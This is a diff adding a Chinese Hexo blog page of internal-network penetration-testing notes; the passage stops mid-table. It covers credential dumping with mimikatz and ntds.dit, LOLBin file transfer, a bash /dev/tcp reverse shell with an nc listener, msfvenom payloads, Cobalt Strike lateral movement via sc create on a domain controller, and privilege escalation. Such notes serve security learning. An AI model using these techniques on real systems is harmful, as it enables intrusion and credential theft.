@@ -1,0 +1,966 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo180x180.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-flash.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zy0t1.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.18.0","exturl":true,"sidebar":{"position":"left","display":"always","padding":16,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":{"gitalk":{"order":-1}},"activeClass":"gitalk"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="本文依靠实际渗透测试，仅提供参考，必定会有讲解不清楚的内容，如果有任何错误，欢迎批评指正。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透">
+<meta property="og:url" content="https://zy0t1.github.io/2023/08/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AE%80%E4%BB%8B/index.html">
+<meta property="og:site_name" content="Zy0t1&#39;s blog">
+<meta property="og:description" content="本文依靠实际渗透测试，仅提供参考，必定会有讲解不清楚的内容，如果有任何错误，欢迎批评指正。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-08-27T08:16:59.000Z">
+<meta property="article:modified_time" content="2023-08-27T08:16:59.000Z">
+<meta property="article:author" content="Zy0t1">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="网络">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://zy0t1.github.io/2023/08/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AE%80%E4%BB%8B/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://zy0t1.github.io/2023/08/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AE%80%E4%BB%8B/","path":"2023/08/27/内网渗透简介/","title":"内网渗透"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>内网渗透 | Zy0t1's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+  
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Zy0t1's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">道阻且长，行则将至</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">内网信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">Windows内网信息搜集：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.2.</span> <span class="nav-text">Linux下信息搜集</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="nav-number">2.</span> <span class="nav-text">文件传输</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9SHELL"><span class="nav-number">3.</span> <span class="nav-text">反弹SHELL</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#win%E4%B8%8B%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">3.1.</span> <span class="nav-text">win下反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">3.2.</span> <span class="nav-text">Linux下反弹shell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA"><span class="nav-number">4.</span> <span class="nav-text">隧道代理搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">5.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Win%E4%B8%8B%E6%8F%90%E6%9D%83"><span class="nav-number">5.1.</span> <span class="nav-text">Win下提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux%E6%8F%90%E6%9D%83"><span class="nav-number">5.2.</span> <span class="nav-text">Linux提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8%E6%8F%90%E6%9D%83"><span class="nav-number">5.3.</span> <span class="nav-text">数据库应用提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FTP%E5%BA%94%E7%94%A8%E6%8F%90%E6%9D%83"><span class="nav-number">5.4.</span> <span class="nav-text">FTP应用提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E8%BE%85%E5%8A%A9"><span class="nav-number">5.5.</span> <span class="nav-text">提权辅助</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">5.6.</span> <span class="nav-text">防御措施</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">6.</span> <span class="nav-text">横向移动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">7.</span> <span class="nav-text">权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Win%E4%B8%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">7.1.</span> <span class="nav-text">Win下权限维持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">7.2.</span> <span class="nav-text">Linux权限维持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">7.3.</span> <span class="nav-text">域内权限维持</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4"><span class="nav-number">8.</span> <span class="nav-text">痕迹清除</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Zy0t1"
+      src="/images/head_picture.jpg">
+  <p class="site-author-name" itemprop="name">Zy0t1</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1p5MHQx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Zy0t1"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPTE2OTY3NDI4MDI=" title="网易云音乐 → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;1696742802"><i class="fab wy fa-fw"></i>网易云音乐</span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zy0t1.github.io/2023/08/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AE%80%E4%BB%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head_picture.jpg">
+      <meta itemprop="name" content="Zy0t1">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zy0t1's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="内网渗透 | Zy0t1's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内网渗透
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-08-27 16:16:59" itemprop="dateModified" datetime="2023-08-27T16:16:59+08:00">2023-08-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>14k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>25 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>本文依靠实际渗透测试，仅提供参考，必定会有讲解不清楚的内容，如果有任何错误，欢迎批评指正。</p>
+<span id="more"></span>
+
+<h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><ol>
+<li>服务器支持的脚本语言</li>
+<li>服务器端口探测</li>
+<li>路径信息</li>
+</ol>
+<h4 id="Windows内网信息搜集："><a href="#Windows内网信息搜集：" class="headerlink" title="Windows内网信息搜集："></a>Windows内网信息搜集：</h4><p>目标搜集内容：IP、网关、DNS、DMZ（隔离区、位于外网与内网连接处）、工作组、域</p>
+<blockquote>
+<p>工作组中各个用户可以相互访问，组间也可以相互访问，只是名义上的普通分组。在win中专属的域机制，域之间不可直接访问，实行中心化管理机制“DC”即域控，每一个想要进入该域的机器通过Kerberos协议先访问DC，DC中存储域内用户相关信息“AD”即活动目录，经过SAM来进行NTLM验证对比，有账号管理、软件环境集中管理等。一个域中至少两个DC+AD，域间DNS查询位置</p>
+</blockquote>
+<p>cmd中<code>systeminfo</code>查看机器有关信息；密码存储位置：注册表&#x2F;文件；<code>$I</code>开头的表示文件保存路径，<code>$R</code>开头表示内容；<code>netsh</code>后<code>wlan show profile</code>查看连接过的wifi配置；杀软一般不对内存进行查杀，使用ps脚本（downloadstring）远程下载或webdelivery绕过查杀，；minikatz获取cookie；</p>
+<p>在win server中使用&#96;&#96;net&#96;命令查看域；端口识别389（LDMP、ILS、目录访问）53（DNS）；</p>
+<p>协议-工具：netbios-nbtscan；UDP-unicornscan；ICMP（ping命令，ip层）；ARP-arpscan；</p>
+<p>win下的密码凭证获取：密码格式&#x3D;名称:ID:LM-hash:NTLM-hash:::（在win03server后LM部分不用）；认证过程（本地、网络、域）</p>
+<p>本地：pwd与\system32\config\sam中对比，打开时会显示被另一个程序使用PID&#x3D;4的system，早期版本一直会被lasaa.exe进程使用（win11目前还有），如果一直在内存中，可能拿到明文密码；</p>
+<p>域内：需要windows\NTDS下的ntds.dit文件 + sam文件 (同上)+ system32\config\system.hive文件；使用卷影（Volume Shadow Copy）服务查看已被使用文件，在Server系统上有默认的<code>ntdsutil</code>命令进行挂载，其他工具Vssadmin、Vshadow（MS SDK中有，VStudio）、NinjaCopy；</p>
+<p>密码抓取工具：先用<code>esentutil</code>对ntds.dit文件进行修复，再QuarksPwDump、NtdsAudit、minikatz、PowerSpolit（工具集）拉取密码，再网站或彩虹表解密；</p>
+<p>彩虹表-ophcrack；官方扩展工具包procdump+minikatz配合食用；注册表reg save；laZagne自助脚本获取密码；MySQL中<code>.frm .myd .myi</code>分别表示表结构、数据（winhex打开）、索引树（cmd5网站破解）；常用密码破解软件john、Hydra、Hashcat、Medusa；SharpDecryptPwd.exe破解常用软件密码；</p>
+<h4 id="Linux下信息搜集"><a href="#Linux下信息搜集" class="headerlink" title="Linux下信息搜集"></a>Linux下信息搜集</h4><p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp</code>生成小马，上传之后之后chmod，执行得到meterpreter，以<code>./xxx&amp;</code>表示在后台运行；或者shell中<code>python -c &quot;import pty;pty.spwan(&#39;/bin/bash&#39;)&quot;</code>以shell交互执行</p>
+<pre><code>uname -a //获取系统信息
+ps -elf //列出全部进程（快照），在/proc下有所有进程信息
+top //实时任务管理，root的uid=0，普通用户的uid&gt;1000
+last //最近登陆状态
+lastb //最近失败登录，减少爆破用强密码或者更换ssh端口
+service --status -all //查看服务器状态
+iptables //防火墙
+netstat // 网络状态
+</code></pre>
+<p>重要文件目录：</p>
+<p>&#x2F;etc&#x2F;issue登陆提示前的消息；&#x2F;etc&#x2F;lsb-release或&#x2F;redhat-release或&#x2F;os-release中系统版本信息；&#x2F;etc&#x2F;crontab计划任务；</p>
+<p>&#x2F;proc&#x2F;version存放Linux内核版本+gcc版本；&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;version监视内核构建时间；</p>
+<p>&#x2F;var&#x2F;log日志；&#x2F;etc&#x2F;passwd用户+组+id+用户目录；&#x2F;etc&#x2F;shadow存放用户和hash过的密码；</p>
+<p>.ssh文件下&#x2F;id_rsa存放RSA私钥、&#x2F;authorized、&#x2F;id_rsa.pub存放公钥；</p>
+<hr>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>在win中</p>
+<ul>
+<li><p>ftp命令，从攻击机&#x2F;服务器上下载脚本，anonymous进行匿名化；</p>
+</li>
+<li><p>Bitsadmin自带工具，在PS中有wget、curl、iwr等网络下载工具；</p>
+</li>
+<li><p>Certutil还可管理证书<code>C:\Users\Lenovo\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code>中有缓存，Scp：用户@IP；</p>
+</li>
+<li><p>rundll32.exe用于运行下载的dll；</p>
+</li>
+<li><p>PS脚本：IEX函数将字符串当命令执行，-enc接受base64过的命令</p>
+</li>
+</ul>
+<blockquote>
+<p>HTA &#x3D; html app</p>
+</blockquote>
+<p>Linux：wget、curl、netcat、sftp</p>
+<p>脚本：php、py2、py3、perl、javascript、VBscript、ruby、Lua、Bash、R、Powershell、Jscript</p>
+<blockquote>
+<p>B语言后来借MS发展为VB，VBS大多在网页中用，VBA作为宏语言在应用中嵌入使用</p>
+</blockquote>
+<hr>
+<h3 id="反弹SHELL"><a href="#反弹SHELL" class="headerlink" title="反弹SHELL"></a>反弹SHELL</h3><p>反弹shell原因是，方便进行命令输入，且能够看到回显，而且是交互式的；有在线网站生成</p>
+<h4 id="win下反弹shell"><a href="#win下反弹shell" class="headerlink" title="win下反弹shell"></a>win下反弹shell</h4><ol>
+<li><p>由被控制端将cmd进行重定向到网络中控制端的某一正在监听的端口（反向）；被控端重定向cmd到本地的一个端口，由控制端主动连接</p>
+</li>
+<li><p>Mshta.exe：可以解释并执行.hta（可借此利用js、vbs），payload可由MSF生成</p>
+</li>
+<li><p>Rundll32.exe：可以在内存中加载运行.dll文件，payload由MSF生成</p>
+<blockquote>
+<p>区别于rundl132.exe，为蠕虫变种病毒</p>
+</blockquote>
+</li>
+<li><p>Regsvr32.exe：用于注册&#x2F;注销OLE控件，存在于System32文件夹中</p>
+</li>
+<li><p>Curtutil.exe、powershell（代码混淆Invoke-Obfuscation）</p>
+</li>
+<li><p>msiexe.exe：win上的专门安装文件.msi，MSF可以生成payload</p>
+</li>
+</ol>
+<h4 id="Linux下反弹shell"><a href="#Linux下反弹shell" class="headerlink" title="Linux下反弹shell"></a>Linux下反弹shell</h4><p>标准文件描述符：</p>
+<ul>
+<li>0-stdin-将键盘当作输入</li>
+<li>1-stdout-将显示器作为默认输出</li>
+<li>2-stderr-将报错输出默认输出到显示器</li>
+</ul>
+<p>更改标准输出：</p>
+<pre><code class="bash">exec 1&gt;test
+echo &#39;hello world&#39;1&gt;test	//追加的话需要换成“&gt;&gt;”
+</code></pre>
+<p>更改标准输入：</p>
+<pre><code class="bash">read user 键盘输入+回车;	echo $user	//将键盘输入作为user变量的值
+read user 0&lt; test;	echo $user	//将test文件中的内容赋给user变量
+exec 2&gt;test	//将所有的错误显示到test文件中.....................
+</code></pre>
+<p>自定义描述符：</p>
+<pre><code class="bash">exec 5&gt;test; echo&#39;hello&#39; 1&gt;&amp;5	//在test文件中存放‘hello’，&amp;引用文件描述符
+</code></pre>
+<p><code>/dev/null</code>将任何写入该目录下的东西清空，<code>cat /dev/null &gt;test</code>可用于快速清楚test文件中的内容；下面是常用bash反弹shell命令，更多请见[反弹shell](<span class="exturl" data-url="aHR0cHM6Ly93d3cucmV2c2hlbGxzLmNvbS8=">Online - Reverse Shell Generator (revshells.com)<i class="fa fa-external-link-alt"></i></span>)</p>
+<p>被控端<code>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code>，控制端<code>nc -lvvp IP:Port</code></p>
+<blockquote>
+<p><code>bash -i</code>表示交互式shell，<code>&gt;&amp;</code>用于混合输出（正确错误信息均反弹回来），<code>/dev/tcp</code>通过此文件与目标建立tcp链接，同理也有UDP</p>
+</blockquote>
+<p>反弹shell类型：</p>
+<ol>
+<li>nc进行正向与反向shell+监听，搭配bash</li>
+<li>Perl、PHP、Ruby、Python进行，MSF中可以生成</li>
+<li>Telnet、OpenSSL</li>
+</ol>
+<hr>
+<h3 id="隧道代理搭建"><a href="#隧道代理搭建" class="headerlink" title="隧道代理搭建"></a>隧道代理搭建</h3><p>通常为HTTP代理与Socks代理，前者仅用于传输Web应用，后者使用tcp协议建立在传输层，可应用于telnet、FTP、SMTP等，此外在最新的Socks5中还支持DNS域名解析与IPv6解析；通常用于与DMZ中的机器建立通道，以便后续对内网的扫描等，如果内网机器能出网就反向shell，否则就正向shell</p>
+<ul>
+<li><p>CS中的SMB beacon：</p>
+<ol>
+<li>先开启CS监听器中的beacon SMB</li>
+<li>生成专用SMB木马</li>
+<li>上传至DMZ区中的Web服务器</li>
+<li>使用<code>cpoy 木马 \\域控IP\C$</code>将木马传到域控中</li>
+<li>创建服务<code>sc \\域控IP create 服务名 binpath=&quot;cme.exe /c 木马&quot;</code></li>
+<li>运行该服务<code>sc \\域控IP start 服务名</code></li>
+<li>CS攻击机link域控</li>
+</ol>
+</li>
+<li><p>Socks代理工具：EarthWorm、FRP、ProxyChain、reGeorg、sSocks、SocksCap64；</p>
+<p>MSF中：<code>nmap -A -T4 -p- --script vuln IP</code>扫描指定内网IP段；其中还有Socks5模块；</p>
+</li>
+<li><p>HTTP代理：支持asp、aspx、php、jsp等；工具：Neo-reGeorg；</p>
+</li>
+<li><p>DNS隧道建立工具Dnscat2，分为中继和直连两种模式；本地浏览器会先找<code>C:\\windows\system\drivers\etc\hosts</code>文件后，没有目标后再去寻找DNS服务器，解析类型如下：</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A&#x2F;AA</td>
+<td>IPv4&#x2F;IPv6</td>
+</tr>
+<tr>
+<td>CNAME</td>
+<td>域名的别名</td>
+</tr>
+<tr>
+<td>MX</td>
+<td>smtp邮箱的IP地址</td>
+</tr>
+<tr>
+<td>PTR</td>
+<td>IP反查域名</td>
+</tr>
+<tr>
+<td>NS</td>
+<td>指向一个更大的域名服务器</td>
+</tr>
+<tr>
+<td>SRV</td>
+<td>该服务的IP地址</td>
+</tr>
+</tbody></table>
+<ul>
+<li>ICMP隧道：工具Pingtunnel，建立在IP层，最后手段</li>
+</ul>
+<hr>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>可以从系统、开启的应用、服务等入手查找漏洞；包括溢出提权（系统本身）与第三方组件（其他应用）提权；溢出提权又分为本地溢出和远程溢出，后者通过创建用户并上传exp来进行，后者只需要建立连接然后再利用即可</p>
+<p>win：MS06-067、MS08-067、MS10-084、MS11-014、MS11-05、MS12-020、MS16-032；</p>
+<p>Linux：CVE-2017-7308、CVE-2017-6074、CVE-2017-5123、CVE-2016-9793；</p>
+<p>条件：拿到webshell与普通用户权限、具有某些账号与密码、漏洞与exp</p>
+<h4 id="Win下提权"><a href="#Win下提权" class="headerlink" title="Win下提权"></a>Win下提权</h4><p>提权工具：RottenPotato、OriginPotato、SweetPotato、getsystem.exe、RoguePotato；</p>
+<p>wmic命令可以获取杀软、路径、用户组、应用程序、进程等信息，wmic_info.bat脚本进行信息提取，相似的HIGS.bat、winPEAS.bat、Powerless.bat；</p>
+<ul>
+<li><p>内核漏洞：wmic检查版本，powershell列出已安装的安全补丁<code>systeminfo</code>，在[相关提权网站](<span class="exturl" data-url="aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4=">提权辅助网页 Windows提权辅助 (hacking8.com)<i class="fa fa-external-link-alt"></i></span>)查找为进行防护的漏洞</p>
+</li>
+<li><p>系统服务：可信任服务路径；例如<code>C:\\Program Files\x86</code>如果在<code>C:\\Program</code>下有Program.exe则会去执行后面字符串对应的文件；因为在系统盘下，所以会用相应系统权限去运行；以服务种植该木马，并将该马迁移到其他进程中，防止被发现</p>
+</li>
+<li><p>不安全的服务权限：Java升级、AWVS、windows的升级等都需要系统权限；工具accesschk检查易受攻击的服务</p>
+</li>
+<li><p>注册表权限：工具Subinacl查找是否有不安全的注册表、Autorum可以设置自动启动</p>
+</li>
+<li><p>不安全的文件&#x2F;文件夹：.msi会以系统的权限开启（需要注册表中<code>Always Install Elevated</code>开启）</p>
+</li>
+</ul>
+<p>msf：<code>getsystem</code>以命名管道进行提权；<code>exploit/windows/local/bypassuac</code>模块可以对uac（用户账户控制）进行绕过；<code>post/multi/recon/local_exploit_Suggester</code>可以检测win-kernel漏洞；<code>exploit/windows/local/unquoted_service_path</code>对可信任服务路径进行利用;<code>~/service_permissions</code>进行不安全服务的利用；<code>~always_install_elevated</code>对.msi安装模块利用；</p>
+<p>CobalStrick中脚本管理可以安装.cna脚本（一整个包）</p>
+<h4 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h4><p>在LAMP中拿到webshell后得到www-data用户，权限极低；</p>
+<p>信息搜集：脚本linpeas.sh</p>
+<table>
+<thead>
+<tr>
+<th>信息</th>
+<th>路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>系统版本</td>
+<td>&#x2F;etc&#x2F;issue；&#x2F;etc&#x2F;*-realease</td>
+</tr>
+<tr>
+<td>内核版本</td>
+<td>uname -a&#x2F;-mrs</td>
+</tr>
+<tr>
+<td>环境变量</td>
+<td>&#x2F;etc&#x2F;profile；&#x2F;etc&#x2F;bashrc</td>
+</tr>
+<tr>
+<td>网络</td>
+<td>&#x2F;etc&#x2F;network&#x2F;interfaces；&#x2F;etc&#x2F;sysconfig&#x2F;network</td>
+</tr>
+<tr>
+<td>应用与服务</td>
+<td>&#x2F;etc&#x2F;services；ps -aux</td>
+</tr>
+<tr>
+<td>计划</td>
+<td>ls -alh；&#x2F;var&#x2F;spool&#x2F;cron</td>
+</tr>
+<tr>
+<td>应用配置</td>
